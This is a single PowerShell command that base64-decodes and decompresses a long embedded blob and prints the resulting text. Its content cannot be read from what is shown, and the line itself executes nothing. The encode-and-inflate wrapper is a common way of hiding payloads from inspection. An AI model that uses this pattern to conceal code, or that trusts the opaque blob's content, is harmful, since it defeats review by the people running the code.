Write-Host $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('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')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();